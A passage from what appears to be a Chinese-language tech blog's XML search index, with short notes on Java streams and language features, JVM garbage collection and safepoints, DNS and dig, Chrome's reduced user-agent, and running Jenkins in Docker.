]]></content>
      <categories>
        <category>Filebeat</category>
      </categories>
      <tags>
        <tag>Filebeat</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Gitlab Force Delete Remotes Branchs</title>
    <url>/posts/7b90346d/</url>
    <content><![CDATA[<h3 id="Intro-Gitlab-Force-Delete-Remotes-Branchs"><a href="#Intro-Gitlab-Force-Delete-Remotes-Branchs" class="headerlink" title="Intro Gitlab Force Delete Remotes Branchs"></a>Intro Gitlab Force Delete Remotes Branchs</h3><span id="more"></span>
<p>這篇介紹Gitlab Force Delete Remotes Branchs。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Gitlab 將 origin/branch 砍掉時，在sourceTree上origin的線會消失。</span><br><span class="line">將<span class="built_in">local</span> repository branch 砍掉後，在sourceTree上<span class="built_in">local</span> repository的線會消失。</span><br><span class="line"></span><br><span class="line">結論 做上述操作後，會找不到主要修改的branch及記錄!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Fully qualified domain name</title>
    <url>/posts/f9db401/</url>
    <content><![CDATA[<h3 id="Fully-qualified-domain-name"><a href="#Fully-qualified-domain-name" class="headerlink" title="Fully qualified domain name"></a>Fully qualified domain name</h3><span id="more"></span>
<p>這篇介紹Fully qualified domain name。<br>完全限定域名（英語：Fully qualified domain name），縮寫為FQDN，<br>又譯為完全資格域名、完整領域名稱，又稱為絕對領域名稱（absolute domain name）、絕對域名。</p>
<h3 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">網域名稱的一種，能指定其在域名系統 (DNS) 樹狀圖下的一個確實位置。一個完全資格域名會包含所有域名級別，包括 Top-level Domain 和 RootDomain。</span><br><span class="line">完整網域名稱這個名稱的由來，是因為它沒有模糊空間，只能用一種方式來解析。完整網域名稱是因應網際網路上需要一個統一識別方式而出現，在1980年代後期快速成長。</span><br><span class="line"></span><br><span class="line">Example: myhost.example.com</span><br><span class="line">RootDomain: myhost</span><br><span class="line">Top-level Domain: com</span><br></pre></td></tr></table></figure>

<h3 id="網域唯一"><a href="#網域唯一" class="headerlink" title="網域唯一"></a>網域唯一</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">完整網域名稱由主機名稱與母網域名稱兩部份所組成，例如有一部伺服器的本地主機名為myhost，</span><br><span class="line">而其母域名為example.com，那指向該伺服器的完整網域名稱就是myhost.example.com。</span><br><span class="line">雖然世界上可能有很多伺服器的本地主機名是myhost，但myhost.example.com是唯一的，</span><br><span class="line">因此完整網域名稱能識別該特定伺服器。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>DNS</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Fixed Andorid Version And Device Model Starting From Chrome110</title>
    <url>/posts/6a1cfd06/</url>
    <content><![CDATA[<h3 id="Intro-Fixed-Andorid-Version-And-Device-Model-Starting-From-Chrome110"><a href="#Intro-Fixed-Andorid-Version-And-Device-Model-Starting-From-Chrome110" class="headerlink" title="Intro Fixed Andorid Version And Device Model Starting From Chrome110"></a>Intro Fixed Andorid Version And Device Model Starting From Chrome110</h3><span id="more"></span>
<p>這篇介紹Fixed Andorid Version And Device Model Starting From Chrome110。</p>
<h3 id="Step-by-step"><a href="#Step-by-step" class="headerlink" title="Step by step"></a>Step by step</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Chrome 110版本後，Google因隱私權開始回應固定的Android version and device model資料。</span><br><span class="line">Android version:Android 10</span><br><span class="line">device model:model K</span><br><span class="line"></span><br><span class="line">改變之前: user-agent includes Android version and device model</span><br><span class="line"></span><br><span class="line">Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Mobile Safari/537.36</span><br><span class="line"></span><br><span class="line">改變之後: reduced user-agent with fixed Android version and device model</span><br><span class="line"></span><br><span class="line">Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.0.0 Mobile Safari/537.36</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Chrome</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Instanceof Pattern Matching</title>
    <url>/posts/324078bd/</url>
    <content><![CDATA[<h3 id="Intro-Instanceof-Pattern-Matching"><a href="#Intro-Instanceof-Pattern-Matching" class="headerlink" title="Intro Instanceof Pattern Matching"></a>Intro Instanceof Pattern Matching</h3><span id="more"></span>
<p>這篇介紹Instanceof Pattern Matching。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Instanceof pattern matching</span><br><span class="line"></span><br><span class="line">Java17以前的寫法，需在迴圈內在轉型一次才能取得物件來使用</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj instanceof MyObject) &#123;</span><br><span class="line">  MyObject myObject = (MyObject) obj;</span><br><span class="line">  // … further logic</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">現在可以在迴圈內取出物件來使用或直接拿方法判斷</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj instanceof MyObject myObject) &#123;</span><br><span class="line">  // … the same logic</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj instanceof MyObject myObject &amp;&amp; myObject.isValid()) &#123;</span><br><span class="line">  // … the same logic</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java17</category>
      </categories>
      <tags>
        <tag>Java17</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro JVM Print GCApplication Stopped Time</title>
    <url>/posts/8f1c92dd/</url>
    <content><![CDATA[<h3 id="Intro-JVM-PrintGCApplicationStoppedTime"><a href="#Intro-JVM-PrintGCApplicationStoppedTime" class="headerlink" title="Intro JVM PrintGCApplicationStoppedTime"></a>Intro JVM PrintGCApplicationStoppedTime</h3><span id="more"></span>
<p>這篇介紹JVM PrintGCApplicationStoppedTime。</p>
<h3 id="Java8"><a href="#Java8" class="headerlink" title="Java8"></a>Java8</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">加入-XX:+PrintGCApplicationStoppedTime後，在gc.log會印出類似下方的資訊</span><br><span class="line">Total time <span class="keyword">for</span> <span class="built_in">which</span> application threads were stopped: 0.0040837 seconds, Stopping threads took: 0.0006238 seconds</span><br><span class="line">這個stopped時間是JVM裡所有Stop-the-world的時間，包含GC Time + Thread Stopped Time。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro JVM Safe Point</title>
    <url>/posts/32c23ca/</url>
    <content><![CDATA[<h3 id="Intro-JVM-Safe-Point"><a href="#Intro-JVM-Safe-Point" class="headerlink" title="Intro JVM Safe Point"></a>Intro JVM Safe Point</h3><span id="more"></span>
<p>這篇介紹JVM Safe Point。</p>
<h3 id="About-JVM-Safe-Point"><a href="#About-JVM-Safe-Point" class="headerlink" title="About JVM Safe Point"></a>About JVM Safe Point</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">JVM HotSpot的實現中，使用一組稱為OopMap的data structure來存放reference object，</span><br><span class="line">從而可以快速且準確的完成GC Root掃描。但Process執行的過程中，引用關係隨時都可能發生變化，</span><br><span class="line">而HotSpot虛擬機只會在特殊的指令位置才會生成OopMap來記錄引用關係，</span><br><span class="line">這些位置便被稱為Safepoint。換句話說，就是在Safepoint這個點上，JVM對於使用什麼引用是十分清楚的，</span><br><span class="line">這個時候是可以很快完成GC Roots的掃描和可行性分析的。HotSpot會在所有方法返回之前，</span><br><span class="line">以及所有Uncounted loop的循環回跳之前放置Safepoint。當需要GC時候，JVM會首先設置一個標誌，</span><br><span class="line">然後等待所有thread進入Safepoint，但是不同thread進入Safepoint的時間點不一樣，</span><br><span class="line">先進入Safepoint的thread需要等待其它thread全部進入Safepoint，所以Safepoint是會導致Stop-the-world。</span><br><span class="line"></span><br><span class="line">JVM加參數來觀察<span class="built_in">log</span></span><br><span class="line">-XX:+PrintSafepointStatistics</span><br><span class="line">-XX:PrintSafepointStatisticsCount=1</span><br><span class="line"></span><br><span class="line">在catalina.out下可觀察到以下<span class="built_in">log</span></span><br><span class="line">         vmop                    [threads: total initially_running wait_to_block]    [time: spin block <span class="built_in">sync</span> cleanup vmop] page_trap_count</span><br><span class="line">1346.591: no vm operation                  [     911          0              0    ]      [     0     0     0     2     0    ]  0</span><br><span class="line">         vmop                    [threads: total initially_running wait_to_block]    [time: spin block <span class="built_in">sync</span> cleanup vmop] page_trap_count</span><br><span class="line">1347.594: no vm operation                  [     911          0              0    ]      [     0     0     0     2     0    ]  0</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Java8 Map To Object List</title>
    <url>/posts/b1c8946c/</url>
    <content><![CDATA[<h3 id="Intro-Java8-Map-To-Object-List"><a href="#Intro-Java8-Map-To-Object-List" class="headerlink" title="Intro Java8 Map To Object List"></a>Intro Java8 Map To Object List</h3><span id="more"></span>
<p>這篇介紹Intro Java8 Map To Object List。</p>
<h3 id="Example-Code-Setup"><a href="#Example-Code-Setup" class="headerlink" title="Example Code Setup"></a>Example Code Setup</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;key3&quot;</span>, <span class="string">&quot;value3&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Example-Map-To-Object-List"><a href="#Example-Map-To-Object-List" class="headerlink" title="Example : Map To Object List"></a>Example : Map To Object List</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List&lt;Example&gt; list = map.entrySet().stream().map(m -&gt; new Example(m.getKey(), m.getValue())).collect(Collectors.toList());</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java8</category>
      </categories>
      <tags>
        <tag>Java8</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Java8 groupingBy Collector</title>
    <url>/posts/dfd67116/</url>
    <content><![CDATA[<h3 id="Intro-Java8-groupingBy-Collector"><a href="#Intro-Java8-groupingBy-Collector" class="headerlink" title="Intro Java8 groupingBy Collector"></a>Intro Java8 groupingBy Collector</h3><span id="more"></span>
<p>這篇介紹Intro Java8 groupingBy Collector。</p>
<h3 id="Example-Code-Setup"><a href="#Example-Code-Setup" class="headerlink" title="Example Code Setup"></a>Example Code Setup</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">To demonstrate the usage of groupingBy(), <span class="built_in">let</span><span class="string">&#x27;s define a BlogPost class (we will use a stream of BlogPost objects):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class BlogPost &#123;</span></span><br><span class="line"><span class="string">    String title;</span></span><br><span class="line"><span class="string">    String author;</span></span><br><span class="line"><span class="string">    BlogPostType type;</span></span><br><span class="line"><span class="string">    int likes;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Next, the BlogPostType:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">enum BlogPostType &#123;</span></span><br><span class="line"><span class="string">    NEWS,</span></span><br><span class="line"><span class="string">    REVIEW,</span></span><br><span class="line"><span class="string">    GUIDE</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then the List of BlogPost objects:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">List&lt;BlogPost&gt; posts = Arrays.asList( ... );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let&#x27;</span>s also define a Tuple class that will be used to group posts by the combination of their <span class="built_in">type</span> and author attributes:</span><br><span class="line"></span><br><span class="line">class Tuple &#123;</span><br><span class="line">    BlogPostType <span class="built_in">type</span>;</span><br><span class="line">    String author;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Example-Simple-Grouping-by-a-Single-Column"><a href="#Example-Simple-Grouping-by-a-Single-Column" class="headerlink" title="Example : Simple Grouping by a Single Column"></a>Example : Simple Grouping by a Single Column</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Map&lt;BlogPostType, List&lt;BlogPost&gt;&gt; postsPerType = posts.stream().collect(groupingBy(BlogPost::getType));</span><br></pre></td></tr></table></figure>

<h3 id="Example-groupingBy-with-a-Complex-Map-Key-Type"><a href="#Example-groupingBy-with-a-Complex-Map-Key-Type" class="headerlink" title="Example : groupingBy with a Complex Map Key Type"></a>Example : groupingBy with a Complex Map Key Type</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Map&lt;Tuple, List&lt;BlogPost&gt;&gt; postsPerTypeAndAuthor = posts.stream().collect(groupingBy(post -&gt; new Tuple(post.getType(), post.getAuthor())));</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java8</category>
      </categories>
      <tags>
        <tag>Java8</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro JVM Use Compressed Oops</title>
    <url>/posts/b6fe6120/</url>
    <content><![CDATA[<h3 id="Intro-JVM-Use-Compressed-Oops"><a href="#Intro-JVM-Use-Compressed-Oops" class="headerlink" title="Intro JVM Use Compressed Oops"></a>Intro JVM Use Compressed Oops</h3><span id="more"></span>
<p>這篇介紹JVM Use Compressed Oops。</p>
<h3 id="UseCompressedOops"><a href="#UseCompressedOops" class="headerlink" title="UseCompressedOops"></a>UseCompressedOops</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">從JDK1.6開始在64位元的JVM開始support參數-XX:+UseCompressedOops來壓縮空間及</span><br><span class="line">達到縮小Heap使用。此參數只有用於4G-32G的Heap，超過32G該參數功能會失效。</span><br><span class="line"></span><br><span class="line">小於4G時JVM會使用low virutal address space，亦即在64位元下模擬32位元。</span><br><span class="line">在4G-32G的Heap是使用Zero Based Compressed OOPS。</span><br><span class="line">大於32G是不使用Compressed OOPS。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Java8 Object List To Map</title>
    <url>/posts/d90afd4c/</url>
    <content><![CDATA[<h3 id="Intro-Java8-Object-List-To-Map"><a href="#Intro-Java8-Object-List-To-Map" class="headerlink" title="Intro Java8 Object List To Map"></a>Intro Java8 Object List To Map</h3><span id="more"></span>
<p>這篇介紹Java8 Object List To Map。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">List data structure:</span><br><span class="line">User (Long Id, String username)</span><br><span class="line">List&lt;User&gt; userList = new ArrayList&lt;&gt;();</span><br><span class="line">userList.add(new User(1L, <span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">userList.add(new User(2L, <span class="string">&quot;bbb&quot;</span>));</span><br><span class="line">userList.add(new User(3L, <span class="string">&quot;ccc&quot;</span>));</span><br><span class="line">userList.add(new User(2L, <span class="string">&quot;ddd&quot;</span>));</span><br><span class="line">userList.add(new User(3L, <span class="string">&quot;eee&quot;</span>));</span><br><span class="line"></span><br><span class="line">1.Map&lt;Long, String&gt; map = userList.stream().collect(Collectors.toMap(User::getId, User::getUsername);</span><br><span class="line">Error: java.lang.IllegalStateException: Duplicate key bbb</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.Map&lt;Long, String&gt; map = userList.stream().collect(Collectors.toMap(User::getId, User::getUsername, (v1, v2) -&gt; v1)); //取前面的值</span><br><span class="line">2.Map&lt;Long, String&gt; map = userList.stream().collect(Collectors.toMap(User::getId, User::getUsername, (v1, v2) -&gt; v2)); //取後面的值</span><br><span class="line">3.Map&lt;Long, List&lt;String&gt;&gt; map = userList.stream().collect(Collectors.toMap(User::getId,</span><br><span class="line">                e -&gt; new ArrayList&lt;String&gt;(Arrays.asList(e.getUsername())),</span><br><span class="line">                (List&lt;String&gt; oldList, List&lt;String&gt; newList) -&gt; &#123;</span><br><span class="line">                    oldList.addAll(newList);</span><br><span class="line">                    <span class="built_in">return</span> oldList;</span><br><span class="line">                &#125;));</span><br><span class="line">//相同的key，把不同的value存在同一個List&lt;String&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java8</category>
      </categories>
      <tags>
        <tag>Java8</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Java Garbage Collection Algorithms</title>
    <url>/posts/2558dd5d/</url>
    <content><![CDATA[<h3 id="Intro-Java-Garbage-Collection-Algorithms"><a href="#Intro-Java-Garbage-Collection-Algorithms" class="headerlink" title="Intro Java Garbage Collection Algorithms"></a>Intro Java Garbage Collection Algorithms</h3><span id="more"></span>
<p>這篇介紹Intro Java Garbage Collection Algorithms。</p>
<h3 id="Java8"><a href="#Java8" class="headerlink" title="Java8"></a>Java8</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">default 使用 Parallel garbage collection</span><br><span class="line">Simimar to serial GC, It uses mark-copy <span class="keyword">in</span> the Young Generation and mark-sweep-compact</span><br><span class="line"><span class="keyword">in</span> the Old Generation. Multiple concurrent threads are used <span class="keyword">for</span> marking and </span><br><span class="line">copying / compacting phases. </span><br><span class="line">You can configure the number of threads using -XX:ParallelGCThreads=N option.</span><br><span class="line"></span><br><span class="line">Parallel Garbage Collector is suitable on multi-core machines <span class="keyword">in</span> cases <span class="built_in">where</span> your </span><br><span class="line">primary goal is to increase throughput by efficient usage of existing system resources.</span><br><span class="line">Using this approach, GC cycle <span class="built_in">times</span> can be considerably reduced.</span><br><span class="line"></span><br><span class="line">簡單來說，Parallel garbage collection通常用於較小的Java Heap，注重garbage collection的效率。</span><br><span class="line"></span><br><span class="line">To use parallel GC, use below JVM argument:</span><br><span class="line"></span><br><span class="line">-XX:+UseParallelGC</span><br></pre></td></tr></table></figure>

<h3 id="Java9"><a href="#Java9" class="headerlink" title="Java9"></a>Java9</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">default 使用 G1 garbage collection</span><br><span class="line">The G1 (Garbage First) garbage collector was available <span class="keyword">in</span> Java 7 and is designed</span><br><span class="line">to be the long term replacement <span class="keyword">for</span> the CMS collector. The G1 collector is a </span><br><span class="line">parallel, concurrent, and incrementally compacting low-pause garbage collector.</span><br><span class="line"></span><br><span class="line">This approach involves segmenting the memory heap into multiple small regions</span><br><span class="line">(typically 2048). Each region is marked as either young generation (further </span><br><span class="line">devided into eden regions or survivor regions) or old generation. </span><br><span class="line">This allows the GC to avoid collecting the entire heap at once, and instead</span><br><span class="line">approach the problem incrementally. It means that only a subset of the</span><br><span class="line">regions is considered at a time.</span><br><span class="line"></span><br><span class="line">簡單來說，G1 garbage collection通常用於較大的Java Heap，注重garbage collection的停頓時間。</span><br><span class="line"></span><br><span class="line">If you want to use <span class="keyword">in</span> Java 7 or Java 8 machines, use JVM argument as below:</span><br><span class="line"></span><br><span class="line">-XX:+UseG1GC</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>GarbageCollection</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
        <tag>GarbageCollection</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Jdk9 To Jdk17 Process</title>
    <url>/posts/d27ec231/</url>
    <content><![CDATA[<h3 id="Intro-Jdk9-To-Jdk17-Process"><a href="#Intro-Jdk9-To-Jdk17-Process" class="headerlink" title="Intro Jdk9 To Jdk17 Process"></a>Intro Jdk9 To Jdk17 Process</h3><span id="more"></span>
<p>這篇介紹Jdk9 To Jdk17 Process。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">JDK 9到JDK 17的演進回顧。</span><br><span class="line">由於JDK 9 到 JDK 17之間的JEP數量數以百計，且不全為語法新特性，而多數新特性會先以</span><br><span class="line">預覽方式加入，後續訂版為正式特性，因上述原因，所有JEP內容不會逐一表列。</span><br><span class="line"></span><br><span class="line">JDK 9</span><br><span class="line">JEP 261-Module System：Java平台模組系統，允許將代碼區分模組，以提高代碼的可維護性</span><br><span class="line">和可重用性。</span><br><span class="line">JEP 213-Milling Project Coin</span><br><span class="line">JDK-8071453 Allow interface methods to be private：允許在介面中定義私有方法。</span><br><span class="line">JEP 222-JShell：可以在不編寫完整程序的情況下執行Java代碼片段。</span><br><span class="line"></span><br><span class="line">JDK 10</span><br><span class="line">JEP 286-Local-Variable Type Inference：引入了var關鍵字，允許在區域變數聲明中進行類型</span><br><span class="line">推斷。</span><br><span class="line"></span><br><span class="line">JDK 11</span><br><span class="line">JEP 321-HTTP Client：引入一個標準的HTTP客戶端API。</span><br><span class="line">JEP 323-Local-Variable Syntax <span class="keyword">for</span> Lambda Parameters：擴展了區域變數類型推斷，以支持</span><br><span class="line">Lambda表達式的參數。</span><br><span class="line"></span><br><span class="line">JDK 12</span><br><span class="line">Teeing Collector <span class="keyword">in</span> Stream API：允許將一個流分成兩個分支，並對這兩個分支分別執行不同</span><br><span class="line">的收集操作，最後將結果合併。</span><br><span class="line"></span><br><span class="line">JDK 13</span><br><span class="line">https://openjdk.org/projects/jdk/13/</span><br><span class="line">JDK 14</span><br><span class="line">JEP 361-Switch Expression：增強switch語句，允許它作為表達式使用，從而減少樣板代碼。</span><br><span class="line"></span><br><span class="line">JDK 15</span><br><span class="line">JEP 378-Text Blocks：文本塊語法，允許多行字符串文字的更清晰和易讀的定義。</span><br><span class="line"></span><br><span class="line">JDK 16</span><br><span class="line">JEP 395-Records：記錄類型，使創建用於表示數據的不可變類更加簡單。</span><br><span class="line">JEP 380-Unix-Domain Socket Channels：不透過網路協議進行本地通訊。</span><br><span class="line">JEP 394-Pattern Matching <span class="keyword">for</span> instanceof：使switch-case包含instanceof並轉型的功能。</span><br><span class="line"></span><br><span class="line">JDK 17</span><br><span class="line">JEP 409-Sealed Classes：封閉類，允許類或介面限制哪些其他類或介面可以擴展或實現它。</span><br><span class="line">JEP 406-Pattern Matching <span class="keyword">for</span> switch (Preview)：使switch-case包含instanceof並轉型的功能。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JDK</category>
      </categories>
      <tags>
        <tag>JDK</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Java Predicate Not Example</title>
    <url>/posts/b610256a/</url>
    <content><![CDATA[<h3 id="Intro-Java-Predicate-Not-Example"><a href="#Intro-Java-Predicate-Not-Example" class="headerlink" title="Intro Java Predicate Not Example"></a>Intro Java Predicate Not Example</h3><span id="more"></span>
<p>這篇介紹Java Predicate Not Example。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">In order to negate an existing predicate, the Predicate.not() static method added to Java 11.</span><br><span class="line">The Predicate class is present <span class="keyword">in</span> java.util.function package.</span><br><span class="line"></span><br><span class="line">你可以使用</span><br><span class="line">// invert a Predicate, will be even shorter with static import</span><br><span class="line">collection.stream()</span><br><span class="line">  .filter(Predicate.not(MyObject::isEmpty))</span><br><span class="line">  .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">使用Predicate 來產生偶數、奇數集合的範例</span><br><span class="line">List&lt;Integer&gt; list = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);</span><br><span class="line">  </span><br><span class="line">// creating a predicate <span class="keyword">for</span> negation</span><br><span class="line">Predicate&lt;Integer&gt; even = i -&gt; i % 2 == 0;</span><br><span class="line"></span><br><span class="line">// creating a predicate object <span class="built_in">which</span></span><br><span class="line">// is negation os supplied predicate</span><br><span class="line">Predicate&lt;Integer&gt; odd = Predicate.not(even);</span><br><span class="line"></span><br><span class="line">// filtering the even number using even predicate</span><br><span class="line">List&lt;Integer&gt; evenNumbers</span><br><span class="line">	= list.stream().filter(even).collect(</span><br><span class="line">		Collectors.toList());</span><br><span class="line"></span><br><span class="line">// filtering the odd number using odd predicate</span><br><span class="line">List&lt;Integer&gt; oddNumbers</span><br><span class="line">	= list.stream().filter(odd).collect(</span><br><span class="line">		Collectors.toList());</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Jenkins</title>
    <url>/posts/35f7a1d0/</url>
    <content><![CDATA[<h3 id="Intro-Jenkins"><a href="#Intro-Jenkins" class="headerlink" title="Intro Jenkins"></a>Intro Jenkins</h3><span id="more"></span>
<p>這篇介紹Jenkins - The leading open source automation server,<br>Jenkins provides hundreds of plugins to support building, deploying and automating any project.</p>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/jenkinsneedyou.png" width="10%" />

<h3 id="Intro-Jenkins-1"><a href="#Intro-Jenkins-1" class="headerlink" title="Intro Jenkins"></a>Intro Jenkins</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Jenkins provides <span class="built_in">users</span> with a Web GUI to operate.</span><br><span class="line"></span><br><span class="line">Jenkins plugin:</span><br><span class="line">Jenkins provides thousands of plugins to meet your multiple needs.</span><br><span class="line">https://plugins.jenkins.io/](https://plugins.jenkins.io/</span><br><span class="line"></span><br><span class="line">What can you <span class="keyword">do</span> <span class="keyword">in</span> Jenkins:</span><br><span class="line">- Build tomcat war</span><br><span class="line">- Deploy tomcat war</span><br><span class="line">- Use ansible</span><br><span class="line">- Run shell script</span><br><span class="line">- Check config with ansible</span><br><span class="line"></span><br><span class="line">How to build Jenkins:</span><br><span class="line">We use docker to build jenkins and use volume to keep config.</span><br><span class="line">So it<span class="string">&#x27;s easy for rebuild when your jenkins is dead and also easy for upgrade.</span></span><br></pre></td></tr></table></figure>

<h3 id="Build-jenkins-with-docker"><a href="#Build-jenkins-with-docker" class="headerlink" title="Build jenkins with docker"></a>Build jenkins with docker</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Pull docker image:</span><br><span class="line">$ docker pull &#123;url&#125;</span><br><span class="line"></span><br><span class="line">Create jenkins container:</span><br><span class="line">$ docker run -itd --name jenkins -v jenkins:/var/jenkins_home --restart always -p &#123;port&#125;:8080 -e JAVA_OPTS=-Duser.timezone=Asia/Taipei -e TZ=Asia/Taipei -e LANG=en_US.UTF8 &#123;url&#125;</span><br><span class="line"></span><br><span class="line">memo:</span><br><span class="line">&#123;port&#125;:open up externally port number</span><br><span class="line"></span><br><span class="line">Check your jenkins container:</span><br><span class="line">$ docker ps -a</span><br><span class="line"></span><br><span class="line">Open your browser and enter ip:port and you will see jenkins ask administrator password:</span><br><span class="line"></span><br><span class="line">Use <span class="built_in">command</span> to get administrator password:</span><br><span class="line">$ docker logs jenkins</span><br><span class="line"></span><br><span class="line">How to upgrade Jenkins:</span><br><span class="line">$ docker stop jenkins</span><br><span class="line">$ docker <span class="built_in">rm</span> jenkins</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Linux Dig</title>
    <url>/posts/1cdf387b/</url>
    <content><![CDATA[<h2 id="Intro-Linux-Dig"><a href="#Intro-Linux-Dig" class="headerlink" title="Intro Linux Dig"></a>Intro Linux Dig</h2><span id="more"></span>
<p>這篇介紹在Linux如何使用dig指令。</p>
<h2 id="安裝dig"><a href="#安裝dig" class="headerlink" title="安裝dig:"></a>安裝dig:</h2><p>yum install bind-utils</p>
<h2 id="常用-dig-debug-的幾個參數說明"><a href="#常用-dig-debug-的幾個參數說明" class="headerlink" title="常用 dig debug 的幾個參數說明:"></a>常用 dig debug 的幾個參數說明:</h2><p>@global-server: 指定 DNS server 要用哪台<br>-x: 反向查詢<br>+trace: 查看 DNS 從最上層 root 往下跑，到底經過哪些節點<br>+short: 簡短輸出 (寫程式 追蹤方便使用)</p>
<h2 id="dig-使用操作範例"><a href="#dig-使用操作範例" class="headerlink" title="dig 使用操作範例"></a>dig 使用操作範例</h2><p>$ dig @ns1.google.com <span class="exturl" data-url="aHR0cDovL3d3dy5nb29nbGUuY29tLw==">www.google.com<i class="fa fa-external-link-alt"></i></span> # 指定 NS1 的 dns server<br>$ dig google.com @8.8.4.4 # 指定 dns server<br>$ dig +trace google.com # 追蹤看經過哪些節點<br>$ dig +trace google.com @8.8.8.8 # 指定 dns server + 追蹤路徑經過</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Dig</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Linux TCP IP Connections Limit</title>
    <url>/posts/f24d2ee0/</url>
    <content><![CDATA[<h3 id="Intro-Linux-TCP-IP-Connections-Limit"><a href="#Intro-Linux-TCP-IP-Connections-Limit" class="headerlink" title="Intro Linux TCP IP Connections Limit"></a>Intro Linux TCP IP Connections Limit</h3><span id="more"></span>
